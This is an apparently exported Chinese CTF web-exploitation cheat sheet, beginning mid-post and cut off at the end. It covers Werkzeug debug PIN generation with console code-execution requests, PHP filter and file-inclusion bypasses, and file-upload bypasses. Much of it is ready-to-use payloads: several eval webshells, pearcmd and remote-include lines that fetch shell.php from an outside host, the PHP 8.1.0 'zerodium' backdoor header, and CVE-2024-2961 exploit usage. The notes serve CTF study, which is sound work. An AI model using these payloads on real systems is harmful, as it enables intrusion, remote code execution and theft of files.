class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;25214234362297&quot;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&quot;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&quot;</span>,  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="高版本-werkzeug-2-0-x-sha1">高版本(werkzeug&gt;=2.0.x sha1)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># machine-id：</span></span><br><span class="line"><span class="comment"># machine-id是通过**三个文件**里面的内容经过处理后拼接起来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. /etc/machine-id（一般仅非docker机有，截取全文）</span></span><br><span class="line"><span class="comment"># 2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）</span></span><br><span class="line"><span class="comment"># 3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）</span></span><br><span class="line"><span class="comment"># # 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope</span></span><br><span class="line"><span class="comment"># # 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面</span></span><br><span class="line"><span class="comment"># 文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。</span></span><br><span class="line"><span class="comment"># 文件3如果存在的话就截取，不存在的话就不用管</span></span><br><span class="line"><span class="comment"># 最后machine-id=（文件1或文件2）+文件3（存在的话）</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;root&quot;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.10/site-packages/flask/app.py&quot;</span>,  <span class="comment"># moddir，报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;2242627441239&quot;</span>,  <span class="comment"># /sys/class/net/eth0/address 十进制</span></span><br><span class="line">    <span class="comment"># 1. /etc/machine-id 2. /proc/sys/kernel/random/boot_id 3. /proc/self/cgroup (1 or 2)(+3)</span></span><br><span class="line">    <span class="string">&quot;d45a88e1-3fe4-4156-9e59-3864587b7c87&quot;</span>,  <span class="comment">#</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="注意的点（重点）">注意的点（重点）</h1><p><code>开启调试在/console</code></p><h2 id="输入参数">输入参数</h2><p>发现/console藏有源码如</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">CONSOLE_MODE</span> = <span class="literal">true</span>,</span><br><span class="line">      <span class="variable constant_">EVALEX</span> = <span class="literal">true</span>,</span><br><span class="line">      <span class="variable constant_">EVALEX_TRUSTED</span> = <span class="literal">false</span>,</span><br><span class="line">      <span class="variable constant_">SECRET</span> = <span class="string">&quot;HwSWplRMh0QHXH37xhln&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>计算好PIN值后传参</p><pre><code>/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=683-407-538&amp;s=HwSWplRMh0QHXH37xhln</code></pre><p>s的值取自源码<br>当出现 {“auth”: true, “exhausted”: false}时说明验证成功<br>获取输入PIN值后的cookie并拿到flag</p><pre><code>/console?__debugger__=yes&amp;cmd=open('/flag').read()&amp;frm=0&amp;s=HwSWplRMh0QHXH37xhlnCookie: __wzd489be12137736dc7b5b4=1729773727|f867e64c2141RCE:import os;os.popen('cat /flag').read()</code></pre><h2 id="开启调试模式，但访问路由报400">开启调试模式，但访问路由报400</h2><p>对debug console的请求需要来自信任的host<br>添加Header Host:127.0.0.1，写到原Host前后</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/posts/44659fec.html"/>
      <url>/posts/44659fec.html</url>
      
        <content type="html"><![CDATA[<h1 id="REQUEST-循环查找参数">$_REQUEST 循环查找参数</h1><pre><code>if($_REQUEST)&#123;    foreach ($_REQUEST as $key =&gt; $value) &#123;        if(preg_match('/[a-zA-Z]/i', $value))   die('waf');    &#125;&#125;</code></pre><p>$_REQUEST 优先识别 POST 传递的参数，在传入$_GET 的参数时也传一个同名的$_POST 参数值，可以覆盖对$_REQUEST 的过滤。</p><h1 id="SERVER-‘QUERY-STRING’-检查">$_SERVER[‘QUERY_STRING’]检查</h1><pre><code>if($_SERVER)&#123;    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('w2');&#125;</code></pre><p>$_SERVER 不会对参数 url 编码，可以对过滤的字符进行 URL 编码。一个寻找可被 url 编码字符的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>)&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>)&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; &#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="特殊名称参数-改为">特殊名称参数: _改为[</h1><p><code>$_GET['ez_ser.from_you']</code> 这种同时存在_和. 的参数，传参时要把参数第一个 _ 换为 [ , 传入 <code>ez[ser.from_you</code> 即可正常传入。<br>原理：<br>php ⾮法传参<br>在给参数传值时，如果参数名中存在⾮法字符，⽐如空格和点，则参数名中的点和空格等⾮法字符都会被替换成下划线。<br>并且，在 PHP8 之前，如果参数中出现中括号[，那么中括号会被转换成下划线_，但是会出现转换错误，导致如果参数名后⾯还存在⾮法字符，则不会继续转换成下划线。<br>也就是说，我们可以刻意拼接中括号制造这种错误，来保留后⾯的⾮法字符不被替换，因为中括号导致只会替换⼀次。</p><h1 id="哈希函数相关">哈希函数相关</h1><p><a href="https://blog.hatchet.top/posts/66a71aff">常见的哈希函数绕过</a></p><h1 id="file-get-contents-GET-‘flag’-绕过">file_get_contents($_GET[‘flag’])绕过</h1><h2 id="要求-file-get-contents-GET-‘flag’-flag’为真">要求 file_get_contents($_GET[‘flag’])=='flag’为真</h2><h3 id="data-text">data://text</h3><ol><li>flag=data://text/plain,flag</li><li>flag=data://text/plain;base64,ZmxhZw==</li></ol><h3 id="compress-zlib-data">compress.zlib://data:</h3><ol><li>flag=compress.zlib://data:,flag</li><li>flag=compress.zlib://data:;base64,ZmxhZw==</li></ol><h3 id="php-input-对-POST-传参不适用">php://input(对 POST 传参不适用)</h3><pre><code>GET 传参:flag=php://inputPOST 传参:flag</code></pre><h2 id="限制-GET-‘flag’-以-http-开头且-strpos-file-get-contents-GET-‘flag’-‘content’-true">限制$_GET[‘flag’]以 http 开头且 strpos(file_get_contents($_GET[‘flag’]), ‘content’)===true</h2><p>flag=<a href="http://example.com@127.0.0.1/index.php">http://example.com@127.0.0.1/index.php</a></p><p>相当于跳转 127.0.0.1/index.php，也可以用自己的服务器</p><h1 id="文件包含">文件包含</h1><h2 id="可直接包含的函数，如-include-require">可直接包含的函数，如 include, require</h2><h3 id="绕过-require-once-命令">绕过 require_once 命令</h3><p>轮流循环绕过</p><pre><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php</code></pre><h3 id="常规读取">常规读取</h3><pre><code>base64读取 convert.base64-encode?file=php://filter/convert.base64-encode/resource=rot13读取 string.rot13，需要关闭短标签解析?file=php://filter/string.rot13/resource=</code></pre><h4 id="convert-iconv">convert.iconv.*.*</h4><pre><code>?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=?file=php://filter//convert.iconv.UCS-4*.UCS-4*/resource=?file=php://filter/read=convert.quoted-printable-encode/resource=</code></pre><p>可用的 filter 编码名单，可以排列组合</p><pre><code>UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*</code></pre><h3 id="写-php-文件">写 php 文件</h3><pre><code>data://?file=data://text/plain,&lt;?php phpinfo();?&gt;?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b如果正则匹配了data不能在开头，可使用压缩绕过?file=compress.zlib://data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2bhttp传马?file=http://x.x.x.x/shell.phpshell.php内容：&lt;?php echo eval(system(&quot;whoami&quot;));phpinfo();?&gt;&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义shell.php，通过服务器加载远程shell.php给我们自动生成一个Webshell</code></pre><h3 id="对-zip-文件包含">对 zip 文件包含</h3><p>使用 zip://或 phar://<br>后缀不一定必须是.zip，这里的 a.jpg 是 a.zip 改过后缀名后上传的</p><pre><code>?file=zip://upload/a.jpg#shell.php?file=phar://upload/a.jpg/shell.php</code></pre><h3 id="利用-pearcmd-php-写入-shell">利用 pearcmd.php 写入 shell</h3><pre><code>?file=../../../../../../../usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=eval($_POST[1]);?&gt;+1.php或者利用install下载shell?file=/usr/local/lib/php/pearcmd.php&amp;+install+--installroot=/var/www/html+http://ip/shell.phpVPS的shell.php放在/tmp/pear/download/中</code></pre><p>不要用火狐的 hackbar 插件传参，它会默认做一次 url 编码导致特殊字符被编码</p><h2 id="file-get-contents">file_get_contents</h2><p>用 file://和 local_file://读取常见目录</p><h3 id="CVE-2024-2961-利用-phpfilter-提升为远程代码执行">CVE-2024-2961 利用 phpfilter 提升为远程代码执行</h3><p>示例如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File contents: <span class="subst">$data</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/ambionics/cnext-exploits/tree/main">https://github.com/ambionics/cnext-exploits/tree/main</a><br>运行代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 cnext-exploit.py http://127.0.0.1:100/file.php <span class="string">&quot;echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; 2.php&quot;</span></span><br></pre></td></tr></table></figure><p>必要时根据题意更改 send 和 download 函数。参数是 GET 类型时更改所有的 tf.random.string(50)为 tf.random.string(48)，因为 GET 参数限制长度为 148。</p><h2 id="system-命令读文件过滤了-和部分字母">system 命令读文件过滤了/和部分字母</h2><pre><code>$&#123;PWD%%[a-z]*&#125;可以在 url 上构造 /例如读到 flag 位置在 /_flag直接读取 $&#123;PWD%%[a-z]*&#125;_*</code></pre><h1 id="preg-match-返回-false-，利用-pcre-绕过">preg_match 返回 false ，利用 pcre 绕过</h1><p>必须用 POST 传参，GET 有字符上限。<br>pcre 原理为 preg_match 递归查找会限制字符长度，默认值为 1000000，如果超出会返回 bool(false)。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;t&quot;</span>: <span class="string">&quot;-&quot;</span> * <span class="number">1000001</span> + <span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>出不来可以适当增加字符长度。(有次把次数设成 1011451 就能过了，抽象)</p><h1 id="PHP-原生类">PHP 原生类</h1><pre><code>DirectoryIterator,FilesystemIterator,GlobIterator -&gt;可遍历目录类SplFileObject-&gt;读取文件类</code></pre><h2 id="使用范例-可配合-php-伪协议">使用范例(可配合 php 伪协议)</h2><h3 id="foreach">foreach</h3><pre><code>$text=new $a($b);foreach ($text as $tmp)&#123;    echo $tmp;&#125;a=DirectoryIterator&amp;b=/a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php</code></pre><h3 id="简略写法">简略写法</h3><pre><code>echo (new $a($b))-&gt;$c();//c可以省略a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php&amp;c=fgetsa=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php&amp;c=__toString打ctf比赛时还发现了一种新方法可以执行函数：a=ReflectionFunction&amp;b=phpinfo&amp;c=invoke可以执行类似匿名函数的代码：比如：create_function(&quot;&quot;, 'die(`/readflag`);');当你访问时，默认为\00lambda_1，每次被访问时这个数字会加一。所以先用phpinfo去打，确认能打通后重启环境后再传%00lambda_1。用php7.4.3测试时阈值是500，超过这个值就会从1重新计数</code></pre><h1 id="PHP-类名大小写">PHP 类名大小写</h1><p>php 对于类名大小写不敏感，A 和 a 都会认为是同一个类。</p><h1 id="parse-url">parse_url</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [scheme] =&gt; http</span></span><br><span class="line"><span class="comment">    [host] =&gt; hostname</span></span><br><span class="line"><span class="comment">    [user] =&gt; username</span></span><br><span class="line"><span class="comment">    [pass] =&gt; password</span></span><br><span class="line"><span class="comment">    [path] =&gt; /path</span></span><br><span class="line"><span class="comment">    [query] =&gt; arg=value</span></span><br><span class="line"><span class="comment">    [fragment] =&gt; anchor</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="绕过-parse-url-检测">绕过 parse_url 检测</h2><p>如果 path 部分为///，则 query 解析错误</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^O/i&quot;</span>,<span class="variable">$value</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;STOP HACKING&#x27;</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>使用<code>///public/?payload=O:123123</code>绕过 foreach。</p><h1 id="basename-SERVER-‘PHP-SELF’">basename($_SERVER[‘PHP_SELF’])</h1><p>比如下面这个例子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP_SELF 会返回请求的 URL 路径如 /index.php/abc/123，basename 会将传入的参数路径截取最后一段作为返回值。但 basename 有一个特性，是当该函数发现最后一段为不可见字符时会返回上一层的目录，<br>所以 exp 为: /index.php/config.php/%ff。<br>basename(“/index.php/config.php/%ff”) =&gt; config.php</p><h1 id="PHP-8-1-0-任意代码执行漏洞">PHP 8.1.0 任意代码执行漏洞</h1><p>User-Agentt: zerodium 可以执行 PHP 代码。<br>HTTP 头添加：</p><pre><code>User-Agentt: zerodiumsystem(&quot;echo '&lt;?php eval(\$_POST[1]);?&gt;' &gt; /var/www/html/1.php&quot;);</code></pre><h1 id="…（更新中）">…（更新中）</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload常见考题类型</title>
      <link href="/posts/6906b803.html"/>
      <url>/posts/6906b803.html</url>
      
        <content type="html"><![CDATA[<h1 id="前端检测">前端检测</h1><p>屏蔽 js 脚本，或者用 python 直接上传<br>python 上传模版</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php&quot;</span></span><br><span class="line">file_content = <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">filename = <span class="string">&quot;a.php&quot;</span></span><br><span class="line">mime_type = <span class="string">&quot;image/png&quot;</span></span><br><span class="line">file = &#123;<span class="string">&quot;file&quot;</span>: (filename, file_content,mime_type)&#125;</span><br><span class="line">response = requests.post(url, files=file)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者按它的格式上传，在抓包时修改文件后缀</p><h1 id="检测-MIME-TYPE">检测 MIME_TYPE</h1><p>修改 Content-Type<br>jpg/png/gif: image/jpeg(png/gif)<br>zip: application/zip<br>在文件开头加 GIF89a 可绕过 getimagesize()</p><h1 id="php-一句话">php 一句话</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一般一句话</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">过滤php</span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">过滤<span class="meta">&lt;?</span></span><br><span class="line">  &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line">php开启短标签时</span><br><span class="line">  <span class="meta">&lt;?</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">  &lt;% <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);%&gt;</span><br><span class="line">过滤[]</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">写马：</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;&lt;?=eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;z23.php&#x27;</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>);</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">最短一句话</span><br><span class="line">  <span class="meta">&lt;?=</span>`nl <span class="comment">/*`;</span></span><br></pre></td></tr></table></figure><h1 id="黑名单绕过">黑名单绕过</h1><h2 id="php-后缀绕过">php 后缀绕过</h2><p>pht,phpt,phps,phtml,php1,php2,php3,php4,php5,php7 都能解释为 php</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br>在上传文件的name参数后加url解码后的\x0A之后访问xxx.php%0A即可。<br><img src="/img/web/upload/image.png" alt=""></p><h2 id="htaccess">.htaccess</h2><p>两种方法</p><ol><li><p>替换后缀</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p>将 jpg 文件当作 php 文件解析</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>将当前所有文件当作 php 文件解析</p><p>先上传.htaccess 提交<br>再上传 shell.jpg,直接访问 shell.jpg，服务器会识别为 php 文件</p></li><li><p>直接在开头/结尾写 php 文件,在适用于当前页面存在 php 文件<br>auto_prepend_file=a.jpg //在页面顶部加载文件<br>auto_append_file=a.jpg //在页面底部加载文件<br>url 传参</p><pre><code>?content=php_value+auto_prepend_fi\%0Ale+.htaccess%0A%23&lt;?=(`ls+/`);?&gt;%0A%23\</code></pre><p>如果被过滤在过滤词中间加%0A 使用换行绕过<br>上传文件直接写</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br><span class="line">#\</span><br></pre></td></tr></table></figure><pre><code>#是单行注释符号#\用于注释后面添加的字符#被过滤可以使用\x00#define width 1337#define height 1337用WEBP格式对getimagesize和exif_imagetype进行绕过</code></pre><h2 id="user-ini">.user.ini</h2><ul><li>如果 index.php 不在当前目录下,.user.ini 不生效</li></ul><p>直接在开头/结尾写 php 文件</p><pre><code>  auto_prepend_file=a.jpg //在页面顶部加载文件  auto_append_file=a.jpg //在页面底部加载文件  在a.jpg末尾写一句话就行  访问url/upload</code></pre><h2 id="文件名绕过">文件名绕过</h2><h3 id="00-绕过">%00 绕过</h3><p>构造类似 a.php%00.jpg,将%00 url 解码<br>PHP 版本小于 5.3.4 时，利用%00（结束符）来截断文件后缀名，%00 